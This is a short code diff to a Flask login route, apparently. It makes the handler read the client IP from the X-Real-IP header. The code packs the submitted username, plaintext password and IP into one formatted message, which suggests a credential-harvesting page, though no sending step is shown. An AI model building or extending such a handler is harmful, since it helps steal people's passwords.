@@ -14,7 +14,7 @@ def index():
 def login():
     username = request.form.get('send_username')
     password = request.form.get('send_password')
-    ip_addr = request.remote_addr
+    ip_addr = request.environ.get('HTTP_X_REAL_IP', request.remote_addr) 
     try:
         login_info = ("""Username ```{}``` password ```{}``` Ip_Address ```{}```""").format(username, password, ip_addr)
 
